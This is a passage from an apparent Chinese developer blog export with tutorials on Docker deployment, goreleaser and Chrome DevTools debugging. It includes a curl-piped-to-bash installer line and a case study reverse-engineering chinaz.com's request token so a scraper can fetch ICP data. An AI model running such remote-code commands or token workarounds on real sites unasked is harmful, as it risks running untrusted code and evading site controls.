class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  mongodb:</span><br><span class="line">    image: mongo</span><br><span class="line">    hostname: mongodb</span><br><span class="line">    command: [--auth]</span><br><span class="line">    environment:</span><br><span class="line">      MONGO_INITDB_ROOT_USERNAME: root</span><br><span class="line">      MONGO_INITDB_ROOT_PASSWORD: password</span><br><span class="line">      MONGO_INITDB_DATABASE: database</span><br><span class="line">      MONGO_USERNAME: username</span><br><span class="line">      MONGO_PASSWORD: password</span><br><span class="line">    volumes:</span><br><span class="line">      - ./.docker/mongo_data:/data/db</span><br><span class="line">      - ./mongo-init.sh:/docker-<span class="keyword">entrypoint</span><span class="language-bash">-initdb.d/mongo-init.sh</span></span><br></pre></td></tr></table></figure><p>mongo-init.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mongo -- <span class="string">&quot;<span class="variable">$MONGO_INITDB_DATABASE</span>&quot;</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">db = db.getSiblingDB(&#x27;admin&#x27;)</span></span><br><span class="line"><span class="string">db.auth(&#x27;$MONGO_INITDB_ROOT_USERNAME&#x27;, &#x27;$MONGO_INITDB_ROOT_PASSWORD&#x27;)</span></span><br><span class="line"><span class="string">db = db.getSiblingDB(&#x27;$MONGO_INITDB_DATABASE&#x27;)</span></span><br><span class="line"><span class="string">db.createUser(&#123;</span></span><br><span class="line"><span class="string">  user: &quot;$MONGO_USERNAME&quot;,</span></span><br><span class="line"><span class="string">  pwd: &quot;$MONGO_PASSWORD&quot;,</span></span><br><span class="line"><span class="string">  roles: [</span></span><br><span class="line"><span class="string">  &#123; role: &#x27;readWrite&#x27;, db: &#x27;$MONGO_INITDB_DATABASE&#x27; &#125;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><h2 id="使用Docker部署Tomcat"><a href="#使用Docker部署Tomcat" class="headerlink" title="使用Docker部署Tomcat"></a>使用Docker部署Tomcat</h2><p>dockerfile</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tomcat:<span class="number">8.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将webapp下的全部删除</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /usr/local/tomcat/webapps/* \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; useradd -ms /bin/bash tomcat \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; <span class="built_in">chown</span> -R tomcat:tomcat /usr/local/tomcat/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 777 /usr/local/tomcat/bin/catalina.sh </span></span><br><span class="line"><span class="comment">#将target下的xx.war拷贝到/usr/local/tomcat/webapps/下</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=tomcat ROOT.war /usr/local/tomcat/webapps/</span></span><br><span class="line"><span class="comment"># 设置启动用户</span></span><br><span class="line"><span class="keyword">USER</span> tomcat</span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /usr/local/tomcat</span></span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="comment">#设置启动命令</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/usr/local/tomcat/bin/catalina.sh&quot;</span>,<span class="string">&quot;run&quot;</span>]</span></span><br></pre></td></tr></table></figure><h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/v2.10.2/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h1 id="docker资源限制"><a href="#docker资源限制" class="headerlink" title="docker资源限制"></a>docker资源限制</h1><p>docker-compose.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service:</span><br><span class="line">  image: nginx</span><br><span class="line">  mem_limit: 512M</span><br><span class="line">  mem_reservation: 128M</span><br><span class="line">  cpus: 0.5</span><br><span class="line">  ports:</span><br><span class="line">    - &quot;80:80&quot;</span><br></pre></td></tr></table></figure><h2 id="踩坑记录："><a href="#踩坑记录：" class="headerlink" title="踩坑记录："></a>踩坑记录：</h2><ol><li>docker</li><li></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/docker.service</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h1><ol><li>镜像分层</li><li></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 云原生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goreleaser 方便的go 二进制包分发工具</title>
      <link href="/2022/11/10/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/11/10/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用bash脚本进行安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sfL https://goreleaser.com/static/run | bash</span><br></pre></td></tr></table></figure><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>go语言是支持跨平台编译的，每次编译发布都手动操作太麻烦了，使用本工具可以在一次配置好后，每次发布时只要一条命令就可以编译发布了。</p><p>首先我们创建一个测试项目，然后编写一个main.go文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// main.go</span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  println(<span class="string">&quot;hello kaka&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go mod init main</span><br></pre></td></tr></table></figure><p>运行<a href="https://goreleaser.com/cmd/goreleaser_init/">init</a>命令以创建示例<code>.goreleaser.yaml</code> 以及<code>.gitignore</code>文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser init</span><br></pre></td></tr></table></figure><p>其中<code>.goreleaser.yaml</code> 是goreleaser发布相关配置，<code>.gitignore</code> 是设置git忽略的文件夹或文件</p><p>.goreleaser.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## This is an example .goreleaser.yml file with some sensible defaults.</span></span><br><span class="line"><span class="comment">## Make sure to check the documentation at https://goreleaser.com</span></span><br><span class="line"><span class="attr">before:</span></span><br><span class="line">  <span class="attr">hooks:</span></span><br><span class="line">    <span class="comment">## You may remove this if you don&#x27;t use go modules.</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">go</span> <span class="string">mod</span> <span class="string">tidy</span></span><br><span class="line">    <span class="comment">## you may remove this if you don&#x27;t need go generate</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">go</span> <span class="string">generate</span> <span class="string">./...</span></span><br><span class="line"><span class="attr">builds:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">env:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CGO_ENABLED=0</span></span><br><span class="line">    <span class="attr">goos:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">linux</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">windows</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">darwin</span></span><br><span class="line"><span class="attr">archives:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">replacements:</span></span><br><span class="line">      <span class="attr">darwin:</span> <span class="string">Darwin</span></span><br><span class="line">      <span class="attr">linux:</span> <span class="string">Linux</span></span><br><span class="line">      <span class="attr">windows:</span> <span class="string">Windows</span></span><br><span class="line">      <span class="attr">386:</span> <span class="string">i386</span></span><br><span class="line">      <span class="attr">amd64:</span> <span class="string">x86_64</span></span><br><span class="line"><span class="attr">checksum:</span></span><br><span class="line">  <span class="attr">name_template:</span> <span class="string">&#x27;checksums.txt&#x27;</span></span><br><span class="line"><span class="attr">snapshot:</span></span><br><span class="line">  <span class="attr">name_template:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; incpatch .Version &#125;&#125;</span>-next&quot;</span></span><br><span class="line"><span class="attr">changelog:</span></span><br><span class="line">  <span class="attr">sort:</span> <span class="string">asc</span></span><br><span class="line">  <span class="attr">filters:</span></span><br><span class="line">    <span class="attr">exclude:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;^docs:&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;^test:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## modelines, feel free to remove those if you don&#x27;t want/use them:</span></span><br><span class="line"><span class="comment">## yaml-language-server: $schema=https://goreleaser.com/static/schema.json</span></span><br><span class="line"><span class="comment">## vim: set ts=2 sw=2 tw=0 fo=cnqoj</span></span><br></pre></td></tr></table></figure><p>.gitignore</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">dist/</span></span><br><span class="line"><span class="string">.idea/</span></span><br></pre></td></tr></table></figure><p>如果是在本地生成release，使用下面的命令即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser release --snapshot --rm-dist</span><br></pre></td></tr></table></figure><p>可以自定义.goreleaser.yaml ，并且使用命令去检查你的配置文件是否有错误</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser check</span><br></pre></td></tr></table></figure><p>也可以只从生成本地开发环境对应的release，例如在macos上使用此命令，只会生成macos版本的二进制文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser build --single-target</span><br></pre></td></tr></table></figure><h2 id="事先跑一下"><a href="#事先跑一下" class="headerlink" title="事先跑一下"></a>事先跑一下</h2><p>如果你想在真正发布以前测试下你的程序，可是使用以下的方法</p><p>只编译项目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser build</span><br></pre></td></tr></table></figure><p>如果当前存在dist目录，可以手动删除dist，或者在命令中加入<code>—rm-dist</code>参数</p><p><img src="/../imgs/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7%20ce4effd525964ad489ac61519a128673/Untitled.png" alt="Untitled"></p><p>编译结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">☁  action [main] tree </span><br><span class="line">.</span><br><span class="line">├── README.md</span><br><span class="line">├── dist</span><br><span class="line">│   ├── CHANGELOG.md</span><br><span class="line">│   ├── action_darwin_amd64_v1</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_darwin_arm64</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_linux_386</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_linux_amd64_v1</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_linux_arm64</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_windows_386</span><br><span class="line">│   │   └── action.exe</span><br><span class="line">│   ├── action_windows_amd64_v1</span><br><span class="line">│   │   └── action.exe</span><br><span class="line">│   ├── action_windows_arm64</span><br><span class="line">│   │   └── action.exe</span><br><span class="line">│   ├── artifacts.json</span><br><span class="line">│   ├── config.yaml</span><br><span class="line">│   └── metadata.json</span><br><span class="line">├── go.mod</span><br><span class="line">└── main.go</span><br></pre></td></tr></table></figure><h2 id="常见的使用场景"><a href="#常见的使用场景" class="headerlink" title="常见的使用场景"></a>常见的使用场景</h2><p>在修完bug后，测试并发布到release中</p><p>在commit代码并push后可以在IDE中，右键把这条打一个标签</p><p><img src="/../imgs/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7%20ce4effd525964ad489ac61519a128673/Untitled%201.png" alt="Untitled"></p><p><img src="/../imgs/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7%20ce4effd525964ad489ac61519a128673/Untitled%202.png" alt="Untitled"></p><p>最后使用命令进行发布</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">goreleaser</span> <span class="string">release</span> <span class="string">--rm-dist</span></span><br></pre></td></tr></table></figure><h2 id="最后效果"><a href="#最后效果" class="headerlink" title="最后效果"></a>最后效果</h2><p>发布并且会有更新日志，不同系统不同架构程序都会打包📦出来</p><p><img src="/../imgs/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7%20ce4effd525964ad489ac61519a128673/Untitled%203.png" alt="Untitled"></p><h2 id="配合Action使用"><a href="#配合Action使用" class="headerlink" title="配合Action使用"></a>配合Action使用</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS Debug</title>
      <link href="/2022/08/17/JS%20Debug/"/>
      <url>/2022/08/17/JS%20Debug/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Bug复现"><a href="#1-Bug复现" class="headerlink" title="1. Bug复现"></a>1. Bug复现</h2><p>复现是调试的第一步。此处使用的是chrome提供的官方环境</p><p><a href="https://googlechrome.github.io/devtools-samples/debug-js/get-started">Demo: Get Started Debugging JavaScript with Chrome DevTools</a></p><ol><li>在一个新的标签页打开demo</li></ol><p><img src="/../imgs/JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34/Untitled.png" alt="Untitled"></p><ol><li>输入数字，计算结果，获得的结果并不对，不是数字相加，而是字符串相加，这时bug就出现啦。也就是你要修复的点。</li></ol><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 1.png)</p><h2 id="2-熟悉Sources"><a href="#2-熟悉Sources" class="headerlink" title="2. 熟悉Sources"></a>2. 熟悉Sources</h2><p>DevTools为不同的任务提供了许多不同的工具，例如更改CSS、分析页面加载性能和监控网络请求。Sources面板是调试JavaScript的地方。</p><ol><li><p>通过快捷键 command+option+i 打开Console面板</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 2.png)</p></li><li><p>点击Souce标签</p><p>Sources面板有三个部分</p><ul><li>文件导航面板，在这里你将会看到页面中所有请求的文件</li><li>代码编辑器，在文件导航面板中选择文件后，文件的内容将会展示</li><li>JavaScript 调试器，用于检测JavaScript的各种功能工具</li></ul></li></ol><h2 id="3-使用断点暂停代码"><a href="#3-使用断点暂停代码" class="headerlink" title="3. 使用断点暂停代码"></a>3. 使用断点暂停代码</h2><p>解决这类问题常见的调试方法就是在代码中插入<code>console.log()</code></p><p>例子：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">updateLabel</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> addend1 = <span class="title function_">getNumber1</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;addend1:&#x27;</span>, addend1);</span><br><span class="line">    <span class="keyword">var</span> addend2 = <span class="title function_">getNumber2</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;addend2:&#x27;</span>, addend2);</span><br><span class="line">    <span class="keyword">var</span> sum = addend1 + addend2;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sum:&#x27;</span>, sum);</span><br><span class="line">    label.<span class="property">textContent</span> = addend1 + <span class="string">&#x27; + &#x27;</span> + addend2 + <span class="string">&#x27; = &#x27;</span> + sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>console.log()<br>方法可以解决这类问题，但是断点可以更快地完成这项工作。断点允许您在代码执行过程中暂停代码，并及时检查该时刻的所有值。与console.log()<br>方法相比，断点有一下优势:</p><ul><li>使用<code>console. log()</code>，您需要手动打开源代码，找到相关的代码，插入<code>Console. log()</code><br>语句，然后重新加载页面，以便在Console中查看消息。使用断点，您可以暂停相关的代码，甚至不知道代码是如何构造的。</li><li>在<code>console.log()</code>语句中，需要显式指定要检查的每个值。有了断点，DevTools就会显示出当时所有变量的值。有时候，甚至都没有意识到一些变量会影响到了代码。</li></ul><p>简而言之，相比使用<code>console.log()</code> 方法，断点能够帮助你更快的找到并修复漏洞。</p><p>如果你想知道程是怎么运行的，你可以有根据的去猜测错误的计算是在click事件触发后计算出来的。因此，您可能希望在单击侦听器执行时暂停代码。事件侦听器断点可以让你做到这一点:</p><ol><li><p>在“JavaScript调试”面板中，单击“事件监听器断点”以展开该部分。DevTools显示了一个可扩展的事件类别列表，如动画和剪贴板。</p></li><li><p>在“鼠标”事件类别旁边，单击“展开”。DevTools显示了一个鼠标事件列表，比如点击和鼠标按下。每个事件旁边都有一个复选框。</p></li><li><p>选中click复选框。DevTools现在设置为当任何点击事件监听器执行时自动暂停。</p></li><li><p>返回demo，再次单击Add Number 1和Number<br>2。DevTools暂停演示并突出显示源代码面板中的一行代码。DevTools应该在这行代码中暂停:</p> <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onClick</span>(<span class="params"></span>) &#123;</span><br></pre></td></tr></table></figure><p>如果你暂停到了不是这行代码，可以点击继续执行脚本按钮，直到暂停这行代码。</p><p>注意，如果你浏览器有插件可能注册了<code>click</code>事件，调试的过程中可能暂停在了插件的<code>click</code>监听器，你可以使用隐私模式来访网页</p></li></ol><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 5.png)</p><p>事件监听器断点只是DevTools中许多类型的断点之一。记住所有不同的类型是值得的，因为每种类型最终都会帮助您尽可能快地调试不同的场景。请参阅<a href="https://developer.chrome.com/docs/devtools/javascript/breakpoints/">暂停使用断点的代码</a><br>，以了解何时以及如何使用每种类型。</p><h2 id="4-逐步调试代码"><a href="#4-逐步调试代码" class="headerlink" title="4. 逐步调试代码"></a>4. 逐步调试代码</h2><p>bug的一个常见原因是脚本以错误的顺序执行。您能够逐行检查代码的执行，每次一行，并准确地找出它在哪里以与您预期不同的顺序执行。</p><ol><li><p>在DevTools的source面板上，单击Step into next函数调用Step into next函数调用来逐步执行<code>onClick()</code><br>函数，一次一行。DevTools突出显示了以下一行代码:</p> <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">inputsAreEmpty</span>()) &#123;</span><br></pre></td></tr></table></figure></li><li><p>单击下一步函数调用的步骤。DevTools执行<code>inputsAreEmpty()</code>而不进入它。注意，DevTools跳过了几行代码。这是因为<br><code>inputsAreEmpty()</code>的计算结果为false，因此if语句的代码块没有执行。</p></li></ol><h2 id="5-设置代码行断点"><a href="#5-设置代码行断点" class="headerlink" title="5. 设置代码行断点"></a>5. 设置代码行断点</h2><p>代码行中断点是最常见的中断点类型。当你想暂停某一行代码时，可以使用代码行断点。</p><ol><li>看updateLabel()中的最后一行代码。</li><li>在代码的左边，你可以看到这一行代码的行号，是32。点击32。DevTools在32的上面放了一个蓝色图标。这意味着在这一行有一个代码行的断点。DevTools现在总是在执行这行代码之前暂停。</li><li>点击恢复脚本的执行 恢复脚本的执行。脚本继续执行，直到它到达第32行。在第29、30和31行，DevTools打印出addend1、addend2的值，以及每行分号右边的sum。</li></ol><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 6.png)</p><h2 id="6-检查变量值"><a href="#6-检查变量值" class="headerlink" title="6. 检查变量值"></a>6. 检查变量值</h2><p><code>addend1</code>、<code>addend2</code>和<code>sum</code>的值看起来很可疑。它们被引号包裹着，这意味着它们是字符串。这是一个很好的假设，可以解释错误的原因。现在是时候收集更多的信息了。DevTools提供了很多检查变量值的工具。</p><h3 id="方法一：作用域面板"><a href="#方法一：作用域面板" class="headerlink" title="方法一：作用域面板"></a>方法一：作用域面板</h3><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 7.png)</p><h2 id="案例：chinaz-com"><a href="#案例：chinaz-com" class="headerlink" title="案例：chinaz.com"></a>案例：chinaz.com</h2><p>背景：</p><p>在某天wego使用chinaz.com查询icp数据没有数据，用burp抓包分析，发现在请求时返回口令不正确稍后再试</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 8.png)</p><p>访问网站重新抓包发现请求数据包中存在token字段</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 9.png)</p><p>使用debug，分析token的生成</p><p>在XHR中设置断点，设置网址包含 <code>/Home/PageData</code> <code>/Home/QiYeData</code></p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 10.png)</p><p>点击查询按钮</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 11.png)</p><p>浏览器在此处停止</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 12.png)</p><p>连续跳出当前函数，发现post数据包</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 13.png)</p><p>进一步发先token所在位置</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 14.png)</p><p>找到token生成的函数为<code>generateWordKey</code> ，参数为公司名称</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 15.png)</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 16.png)</p><p>在generatetoken.js下断点进行观察</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 17.png)</p><p>从变量中也验证了token的生成算法是根据一个随机数和公司名称生成的</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 18.png)</p><p>在控制台中使用<code>generateWordKey</code>函数生成token</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 19.png)</p><p>发包进行测试，可以获取数据</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 20.png)</p><p>做到这里其实并不需要，完全把token的生成算法全部逆向出来，知道大概的流程就可以。</p><p>可以通过<code>generatetoken.js</code> 去生成token，在wego中使用execjs库去执行js代码生成token</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def</span><br><span class="line"><span class="title function_">getToken</span>(self)</span><br><span class="line">:</span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;../../../utils/data/generatetoken.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span></span><br><span class="line"><span class="attr">f</span>:</span><br><span class="line">    js = f.<span class="title function_">read</span>()</span><br><span class="line">ctx = <span class="title function_">compile</span>(js)</span><br><span class="line">token = ctx.<span class="title function_">call</span>(<span class="string">&#x27;generateWordKey&#x27;</span>, self.<span class="property">kw</span>)</span><br><span class="line"><span class="keyword">return</span> token</span><br></pre></td></tr></table></figure><p>成功解决bug获取到icp数据，好耶</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 21.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var _0x1b9ebc = new Pages(_0x25521d[&#x27;gQcZW&#x27;]);</span><br><span class="line">    var _0xe89c07 = generateWordKey(pageKw);</span><br><span class="line">    var _0x410bc0 = generateHostMD5Key(_0xe89c07, enkey);</span><br><span class="line">    var 